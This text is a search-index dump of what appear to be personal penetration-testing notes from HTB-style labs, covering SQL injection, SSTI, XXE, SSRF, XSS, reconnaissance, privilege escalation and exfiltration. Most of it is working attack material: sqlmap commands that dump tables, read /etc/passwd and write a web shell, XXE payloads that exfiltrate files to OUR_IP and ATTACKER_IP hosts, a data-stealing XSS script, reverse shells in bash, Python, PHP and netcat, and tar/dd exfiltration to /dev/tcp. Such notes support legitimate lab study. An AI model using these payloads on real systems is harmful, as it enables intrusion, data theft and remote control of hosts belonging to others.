\"http://www.example.com/?id=1\" --dump -T users -D testdb --where=\"name LIKE 'f%'\"\n</code></pre>"},{"location":"HTB%20Web%20Pentest/SQL%20Injection/#searching-for-data","title":"Searching for Data","text":"<p>Search for all table names containing the keyword <code>user</code></p> <pre><code>sqlmap -u \"http://www.example.com/?id=1\" --search -T user\n</code></pre> <p>search for all column names containing the keyword <code>pass</code></p> <pre><code>sqlmap -u \"http://www.example.com/?id=1\" --search -C pass\n</code></pre>"},{"location":"HTB%20Web%20Pentest/SQL%20Injection/#anti-csrf-token-bypass","title":"Anti-CSRF Token Bypass","text":"<pre><code>sqlmap -u \"http://www.example.com/\" --data=\"id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE\" --csrf-token=\"csrf-token\"\n</code></pre>"},{"location":"HTB%20Web%20Pentest/SQL%20Injection/#unique-value-bypass","title":"Unique Value Bypass","text":"<pre><code>sqlmap -u \"http://www.example.com/?id=1&amp;rp=29125\" --randomize=rp\n</code></pre>"},{"location":"HTB%20Web%20Pentest/SQL%20Injection/#tamper-scripts","title":"Tamper Scripts","text":"<pre><code>sqlmap -u \"http://example.com/vulnerable.php?id=1\" --tamper=space2comment,charencode\n</code></pre> Tamper-Script Description 0eunion Replaces instances of <code>UNION</code> with <code>e0UNION</code> base64encode Base64-encodes all characters in a given payload between Replaces greater than operator (<code>&gt;</code>) with <code>NOT BETWEEN 0 AND #</code> and equals operator (<code>=</code>) with <code>BETWEEN # AND #</code> commalesslimit Replaces (MySQL) instances like <code>LIMIT M, N</code> with <code>LIMIT N OFFSET M</code> equaltolike Replaces all occurrences of operator equal (<code>=</code>) with <code>LIKE</code> counterpart halfversionedmorekeywords Adds (MySQL) versioned comment before each keyword modsecurityversioned Embraces complete query with (MySQL) versioned comment modsecurityzeroversioned Embraces complete query with (MySQL) zero-versioned comment percentage Adds a percentage sign (<code>%</code>) in front of each character (e.g. <code>SELECT</code> \u2192 <code>%S%E%L%E%C%T</code>) plus2concat Replaces plus operator (<code>+</code>) with (MsSQL) function <code>CONCAT()</code> counterpart randomcase Replaces each keyword character with random case value (e.g. <code>SELECT</code> \u2192 <code>SEleCt</code>) space2comment Replaces space character (<code></code>) with comments <code>/</code> space2dash Replaces space character (<code></code>) with a dash comment (<code>--</code>) followed by a random string and a newline (<code>\\n</code>) space2hash Replaces (MySQL) space character (<code></code>) with <code>#</code> followed by a random string and a newline (<code>\\n</code>) space2mssqlblank Replaces (MsSQL) space character (<code></code>) with a random blank character from a valid alternate set space2plus Replaces space character (<code></code>) with <code>+</code> space2randomblank Replaces space character (<code></code>) with a random blank character from a valid alternate set symboliclogical Replaces <code>AND</code> and <code>OR</code> with symbolic counterparts <code>&amp;&amp;</code> and <code>\\|\\|</code> versionedkeywords Encloses each non-function keyword with (MySQL) versioned comment versionedmorekeywords Encloses each keyword with (MySQL) versioned comment"},{"location":"HTB%20Web%20Pentest/SQL%20Injection/#reading-local-files","title":"Reading Local Files","text":"<pre><code>sqlmap -u \"http://www.example.com/?id=1\" --file-read \"/etc/passwd\"\n</code></pre>"},{"location":"HTB%20Web%20Pentest/SQL%20Injection/#writing-local-files","title":"Writing Local Files","text":"<pre><code>sqlmap -u \"http://www.example.com/?id=1\" --file-write \"shell.php\" --file-dest \"/var/www/html/shell.php\"\n</code></pre>"},{"location":"HTB%20Web%20Pentest/SSTI/","title":"SSTI","text":""},{"location":"HTB%20Web%20Pentest/SSTI/#technology-discovery","title":"Technology Discovery","text":""},{"location":"HTB%20Web%20Pentest/SSTI/#payloads","title":"Payloads","text":"<p>https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/</p>"},{"location":"HTB%20Web%20Pentest/XXE%20Injection/","title":"XXE Injection","text":""},{"location":"HTB%20Web%20Pentest/XXE%20Injection/#reading-files","title":"Reading Files","text":"<pre><code>&lt;!DOCTYPE email [\n  &lt;!ENTITY company SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n...\n&lt;email&gt;\n    &amp;company;\n&lt;/email&gt;\n</code></pre> <pre><code>&lt;!DOCTYPE email [\n  &lt;!ENTITY company SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"&gt;\n]&gt;\n...\n&lt;email&gt;\n    &amp;company;\n&lt;/email&gt;\n</code></pre>"},{"location":"HTB%20Web%20Pentest/XXE%20Injection/#rce","title":"RCE","text":"<pre><code># On the attacker server\necho '&lt;?php system($_REQUEST[\"cmd\"]);?&gt;' &gt; shell.php\nsudo python3 -m http.server 80\n</code></pre> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE email [\n  &lt;!ENTITY company SYSTEM \"expect://curl$IFS-O$IFS'OUR_IP/shell.php'\"&gt;\n]&gt;\n&lt;root&gt;\n&lt;name&gt;&lt;/name&gt;\n&lt;tel&gt;&lt;/tel&gt;\n&lt;email&gt;&amp;company;&lt;/email&gt;\n&lt;message&gt;&lt;/message&gt;\n&lt;/root&gt;\n</code></pre>"},{"location":"HTB%20Web%20Pentest/XXE%20Injection/#advanced-exfiltration-with-cdata","title":"Advanced Exfiltration with CDATA","text":"<pre><code># On the attacker server\necho '&lt;!ENTITY joined \"%begin;%file;%end;\"&gt;' &gt; xxe.dtd\npython3 -m http.server 8000\n</code></pre> <pre><code>&lt;!DOCTYPE email [\n  &lt;!ENTITY % begin \"&lt;![CDATA[\"&gt; &lt;!-- prepend the beginning of the CDATA tag --&gt;\n  &lt;!ENTITY % file SYSTEM \"file:///var/www/html/index.php\"&gt; &lt;!-- reference external file --&gt;\n  &lt;!ENTITY % end \"]]&gt;\"&gt; &lt;!-- append the end of the CDATA tag --&gt;\n  &lt;!ENTITY % xxe SYSTEM \"http://OUR_IP:8000/xxe.dtd\"&gt; &lt;!-- reference our external DTD --&gt;\n  %xxe;\n]&gt;\n...\n&lt;email&gt;&amp;joined;&lt;/email&gt; &lt;!-- reference the &amp;joined; entity to print the file content --&gt;\n</code></pre>"},{"location":"HTB%20Web%20Pentest/XXE%20Injection/#error-based-xxe","title":"Error Based XXE","text":"<p>Host a DTD file on attacker's server:</p> <pre><code>&lt;!ENTITY % file SYSTEM \"file:///etc/hosts\"&gt;\n&lt;!ENTITY % error \"&lt;!ENTITY content SYSTEM '%nonExistingEntity;/%file;'&gt;\"&gt;\n</code></pre> <p>Payload:</p> <pre><code>&lt;!DOCTYPE email [\n  &lt;!ENTITY % remote SYSTEM \"http://OUR_IP:8000/xxe.dtd\"&gt;\n  %remote;\n  %error;\n]&gt;\n</code></pre>"},{"location":"HTB%20Web%20Pentest/XXE%20Injection/#blind-data-exfiltration-oob","title":"Blind Data Exfiltration (OOB)","text":"<p>On attacker's server:</p> <p><code>xxe.dtd</code></p> <pre><code>&lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"&gt;\n&lt;!ENTITY % oob \"&lt;!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'&gt;\"&gt;\n</code></pre> <p><code>index.php</code></p> <pre><code>&lt;?php\nif(isset($_GET['content'])){\n    error_log(\"\\n\\n\" . base64_decode($_GET['content']));\n}\n?&gt;\n</code></pre> <pre><code>vi index.php # here write the above PHP code\nphp -S 0.0.0.0:8000\n</code></pre> <p>Payload:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE email [\n  &lt;!ENTITY % remote SYSTEM \"http://OUR_IP:8000/xxe.dtd\"&gt;\n  %remote;\n  %oob;\n]&gt;\n&lt;root&gt;&amp;content;&lt;/root&gt;\n</code></pre>"},{"location":"HTB%20Web%20Pentest/XXE%20Injection/#automated-oob-exfiltration-tool","title":"Automated OOB Exfiltration Tool","text":"<p>https://github.com/enjoiz/XXEinjector</p>"},{"location":"Payloads/BlindRCE/","title":"Blind RCE","text":"<p>Sends result as POST request: <pre><code>&lt;command&gt; | base64 | curl -d @- https://webhook.site/&lt;your_webhook_id&gt;\n</code></pre></p>"},{"location":"Payloads/SQLI/","title":"SQL Injection","text":""},{"location":"Payloads/SQLI/#out-of-band-injection","title":"Out-of-band Injection","text":""},{"location":"Payloads/SQLI/#mysql-and-mariadb","title":"MySQL and MariaDB","text":"<pre><code>SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';\n</code></pre>"},{"location":"Payloads/SQLI/#microsoft-sql-server-mssql","title":"Microsoft\u00a0SQL\u00a0Server (MSSQL)","text":"<pre><code>EXEC xp_cmdshell 'bcp \"SELECT sensitive_data FROM users\" queryout \"\\\\10.10.58.187\\logs\\out.txt\" -c -T';\n</code></pre>"},{"location":"Payloads/SQLI/#oracle","title":"Oracle","text":"<pre><code>DECLARE\n  req UTL_HTTP.REQ;\n  resp UTL_HTTP.RESP;\nBEGIN\n  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);\n  UTL_HTTP.GET_RESPONSE(req);\nEND;\n</code></pre>"},{"location":"Payloads/SSRF/","title":"SSRF","text":"<p>PHP File: <pre><code>&lt;?php header('location:file://'.$_REQUEST['x']); ?&gt;\n&lt;?php system($_GET[\"cmd\"]);?&gt;\n</code></pre></p> <p>Start Server: <pre><code>php -S 0.0.0.0:9001\n</code></pre></p> <p>Payload Example: <pre><code>&lt;iframe height=\"2000\" width=\"800\" src=\"http://&lt;yourip&gt;:9001/exfiltrate.php?x=/etc/passwd\"&gt;&lt;/iframe&gt;\n</code></pre></p>"},{"location":"Payloads/SSRF/#flask-example","title":"Flask Example","text":"<pre><code>from flask import Flask\napp = Flask(__name__)\n\n@app.route('/')\ndef hello_world():\n    return \"\"\"#!/bin/bash\nbash -c 'bash -i &gt;&amp; /dev/tcp/YOUR_IP/9001 0&gt;&amp;1'\n\"\"\"\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8000)\n</code></pre>"},{"location":"Payloads/XSS/","title":"XSS","text":""},{"location":"Payloads/XSS/#xss-steal-file-content-payload","title":"XSS Steal File Content Payload","text":"<p><pre><code>// TrustedSec Proof-of-Concept to steal \n// sensitive data through XSS payload\n\n\nfunction read_body(xhr) \n{ \n    var data;\n\n    if (!xhr.responseType || xhr.responseType === \"text\") \n    {\n        data = xhr.responseText;\n    } \n    else if (xhr.responseType === \"document\") \n    {\n        data = xhr.responseXML;\n    } \n    else if (xhr.responseType === \"json\") \n    {\n        data = xhr.responseJSON;\n    } \n    else \n    {\n        data = xhr.response;\n    }\n    return data; \n}\n\n\n\n\nfunction stealData()\n{\n    var uri = \"/app/superSecretData.html\";\n\n    xhr = new XMLHttpRequest();\n    xhr.open(\"GET\", uri, true);\n    xhr.send(null);\n\n    xhr.onreadystatechange = function()\n    {\n        if (xhr.readyState == XMLHttpRequest.DONE)\n        {\n            // We have the response back with the data\n            var dataResponse = read_body(xhr);\n\n\n            // Time to exfiltrate the HTML response with the data\n            var exfilChunkSize = 2000;\n            var exfilData      = btoa(dataResponse);\n            var numFullChunks  = ((exfilData.length / exfilChunkSize) | 0);\n            var remainderBits  = exfilData.length % exfilChunkSize;\n\n            // Exfil the yummies\n            for (i = 0; i &lt; numFullChunks; i++)\n            {\n                console.log(\"Loop is: \" + i);\n\n                var exfilChunk = exfilData.slice(exfilChunkSize *i, exfilChunkSize * (i+1));\n\n                // Let's use an external image load to get our data out\n                // The file name we request will be the data we're exfiltrating\n                var downloadImage = new Image();\n                downloadImage.onload = function()\n                {\n                    image.src = this.src;\n                };\n\n                // Try to async load the image, whose name is the string of data\n                downloadImage.src = \"http://127.0.0.1/exfil/\" + i + \"/\" + exfilChunk + \".jpg\";\n            }\n\n            // Now grab that last bit\n            var exfilChunk = exfilData.slice(exfilChunkSize * numFullChunks, (exfilChunkSize * numFullChunks) + remainderBits);\n            var downloadImage = new Image();\n            downloadImage.onload = function()\n            {\n                image.src = this.src;   \n            };\n\n            downloadImage.src = \"http://127.0.0.1/exfil/\" + \"LAST\" + \"/\" + exfilChunk + \".jpg\";\n            console.log(\"Done exfiling chunks..\");\n        }\n    }\n}\n\n\n\nstealData();\n</code></pre> Link to source</p> <p>XSS example: <pre><code>&lt;script src=http://10.13.60.191:9000/exfil.js&gt;&lt;/script&gt;\n</code></pre></p>"},{"location":"Payloads/XSS/#svg","title":"SVG","text":"<pre><code>&lt;?xml version=\"1.0\" standalone=\"no\"?&gt;\n&lt;!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"&gt;\n&lt;svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"&gt;\n   &lt;rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" /&gt;\n   &lt;script type=\"text/javascript\"&gt;\n      alert(document.domain);\n   &lt;/script&gt;\n&lt;/svg&gt;\n</code></pre>"},{"location":"Payloads/XXE/","title":"XXE Injection","text":""},{"location":"Payloads/XXE/#in-band","title":"In-Band","text":"<pre><code>&lt;!DOCTYPE foo [\n    &lt;!ELEMENT foo ANY &gt;\n    &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;\n]&gt;\n&lt;contact&gt;\n    &lt;name&gt;&amp;xxe;&lt;/name&gt;\n    &lt;email&gt;test@test.com&lt;/email&gt;\n    &lt;message&gt;test&lt;/message&gt;\n&lt;/contact&gt;\n</code></pre>"},{"location":"Payloads/XXE/#out-of-band","title":"Out-of-Band","text":"<p>Example: <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;upload&gt;\n  &lt;file&gt;\n    http://10.10.27.41/uploads/file_66981c1d9d7f81.07058312.txt\n  &lt;/file&gt;\n&lt;/upload&gt;\n</code></pre></p>"},{"location":"Payloads/XXE/#test-payload","title":"Test Payload","text":"<pre><code>&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY xxe SYSTEM \"http://ATTACKER_IP:1337/\" &gt;]&gt;\n&lt;upload&gt;&lt;file&gt;&amp;xxe;&lt;/file&gt;&lt;/upload&gt;\n</code></pre>"},{"location":"Payloads/XXE/#sampledtd-in-attackers-machine-file-content","title":"<code>sample.dtd</code> (in attacker\u2019s machine) File Content","text":"<pre><code>&lt;!ENTITY % cmd SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"&gt;\n&lt;!ENTITY % oobxxe \"&lt;!ENTITY exfil SYSTEM 'http://ATTACKER_IP:port/?data=%cmd;'&gt;\"&gt;\n%oobxxe;\n</code></pre>"},{"location":"Payloads/XXE/#payload","title":"Payload","text":"<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE upload SYSTEM \"http://ATTACKER_IP:port/sample.dtd\"&gt;\n&lt;upload&gt;\n  &lt;file&gt;&amp;exfil;&lt;/file&gt;\n&lt;/upload&gt;\n</code></pre>"},{"location":"Pentest/1-recon/","title":"Reconnaissance","text":""},{"location":"Pentest/1-recon/#nmap","title":"Nmap","text":""},{"location":"Pentest/1-recon/#initial-scan","title":"Initial scan","text":"<p><pre><code>nmap -sT -p- &lt;IP&gt; -T4\n</code></pre> <pre><code>nmap -sC -sV -sT -p &lt;ports&gt; &lt;IP&gt; -T4\n</code></pre> NMAP cheat sheet</p>"},{"location":"Pentest/1-recon/#vulnerability-scan","title":"Vulnerability Scan","text":""},{"location":"Pentest/1-recon/#basic","title":"Basic:","text":"<pre><code>nmap -Pn --script vuln &lt;IP&gt;\n</code></pre>"},{"location":"Pentest/1-recon/#more","title":"More:","text":"<ul> <li>Article</li> </ul>"},{"location":"Pentest/1-recon/#web-directory-discovery","title":"Web Directory Discovery","text":"<p><pre><code>gobuster dir -w &lt;wordlist.txt&gt; -u &lt;url&gt; -x &lt;file_extensions&gt;\n</code></pre> Gobuster Cheat Sheet</p>"},{"location":"Pentest/1-recon/#vhost-search","title":"Vhost Search","text":"<p><pre><code>ffuf -w &lt;wordlist&gt; -u &lt;url&gt; -H \"Host: FUZZ.example.com\"\n</code></pre> FFUF Cheat Sheet</p>"},{"location":"Pentest/2-resource_dev/","title":"Resource Development","text":""},{"location":"Pentest/2-resource_dev/#msfvenom","title":"MSFVenom","text":"<ul> <li>Reverse Shell Payload Cheatsheet</li> </ul>"},{"location":"Pentest/2-resource_dev/#path-traversal-wordlist","title":"Path Traversal Wordlist","text":"<p>LFI-Jhaddix.txt</p>"},{"location":"Pentest/2-resource_dev/#smb-enumeration","title":"SMB Enumeration","text":"<p>List shared folders: <pre><code>smbclient --no-pass -L //&lt;IP&gt;\n</code></pre></p> <p>Connect folder: <pre><code>smbclient --no-pass //&lt;IP&gt;/&lt;Folder&gt;\n</code></pre></p> <ul> <li>HackTricks SMB</li> </ul>"},{"location":"Pentest/3-initial_access/","title":"Initial Access","text":""},{"location":"Pentest/3-initial_access/#hydra","title":"Hydra","text":"<p>Post method example: <pre><code>hydra -l &lt;username&gt; -P &lt;password list&gt; &lt;target URL&gt; http-post-form \"/&lt;login URI&gt;:&lt;login form data&gt;:&lt;error message&gt;\"\n</code></pre></p> <ul> <li>Cheat Sheet</li> </ul>"},{"location":"Pentest/3-initial_access/#reverse-shell","title":"Reverse Shell","text":"<p><pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1\n\npython -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\n\nrm -f /tmp/a; mkfifo /tmp/a; nc 10.13.60.191 4444 0&lt;/tmp/a | /bin/sh &gt;/tmp/a 2&gt;&amp;1; rm /tmp/a \n</code></pre> * Cheat Sheet * PHP Reverse Shell</p> <p>Listener: <pre><code>nc -lvnp 4444\n</code></pre></p>"},{"location":"Pentest/3-initial_access/#shell-stabilization","title":"Shell Stabilization","text":""},{"location":"Pentest/3-initial_access/#option-1","title":"Option 1","text":"<pre><code>python -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre>"},{"location":"Pentest/3-initial_access/#option-2","title":"Option 2","text":"<p><code>ctrl + z</code> then <pre><code>stty raw -echo &amp;&amp; fg\n</code></pre></p>"},{"location":"Pentest/3-initial_access/#option-3","title":"Option 3","text":"<pre><code>rlwrap nc -lvnp 4444\n</code></pre>"},{"location":"Pentest/4-privilege_escalation/","title":"Privilege Escalation","text":""},{"location":"Pentest/4-privilege_escalation/#linux","title":"Linux","text":""},{"location":"Pentest/4-privilege_escalation/#linpeassh","title":"linpeas.sh","text":"<p>https://linpeas.sh/</p>"},{"location":"Pentest/4-privilege_escalation/#suid-and-sudo-exploit","title":"SUID and <code>sudo</code> Exploit","text":"<p>GTFOBins</p>"},{"location":"Pentest/4-privilege_escalation/#windows","title":"Windows","text":""},{"location":"Pentest/4-privilege_escalation/#winpeas","title":"winPEAS","text":"<p>Github link</p>"},{"location":"Pentest/4-privilege_escalation/#download-file-on-cmd","title":"Download File on cmd","text":"<pre><code>powershell \"(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')\"\n</code></pre>"},{"location":"Pentest/5-exfiltration/","title":"Exfiltration","text":""},{"location":"Pentest/5-exfiltration/#using-tcp-socket","title":"Using TCP Socket","text":"<p>Attacker listener: <pre><code>nc -lvp 8080 &gt; /tmp/exfil.data\n</code></pre></p> <p>From victim: <pre><code>tar zcf - folder/ | base64 | dd conv=ebcdic &gt; /dev/tcp/1.2.3.4/8080\n</code></pre></p> <p>Decrypt data: <pre><code>dd conv=ascii if=exfil.data | base64 -d &gt; exfil.tar\ntar xvf exfil.tar\n</code></pre></p>"},{"location":"Pentest/5-exfiltration/#using-ssh","title":"Using SSH","text":"<pre><code>tar cf - folder/ | ssh kali@1.2.3.4 \"cd /tmp/; tar xpf -\"\n</code></pre>"},{"location":"Pentest/5-exfiltration/#using-https","title":"Using HTTP(S)","text":"<p>From victim: <pre><code>curl --data \"file=$(tar zcf - folder | base64)\" http://&lt;attacker_ip&gt;/contact.php\n</code></pre></p> <p>contact.php: <pre><code>&lt;?php \nif (isset($_POST['file'])) {\n        $file = fopen(\"/tmp/http.bs64\",\"w\");\n        fwrite($file, $_POST['file']);\n        fclose($file);\n   }\n?&gt;\n</code></pre></p> <p>Decode file: <pre><code>sudo sed -i 's/ /+/g' /tmp/http.bs64\ncat /tmp/http.bs64 | base64 -d | tar xvfz -\n</code></pre></p>"},{"location":"Pentest/5-exfiltration/#http-tunneling","title":"HTTP Tunneling","text":"<p>When you can upload file to the web server, using Neo-reGeorg.</p> <ol> <li>Generate encrypted Tunneling clients with <code>key</code> key in the <code>neoreg_servers/</code> directory.</li> </ol> <pre><code>python3 neoreg.py generate -k key\n</code></pre> <ol> <li>Upload file</li> <li>Create tunnel</li> </ol> <pre><code>python3 neoreg.py -k key -u &lt;URL to uploaded file&gt;\n</code></pre> <ol> <li>Access</li> </ol>"}]}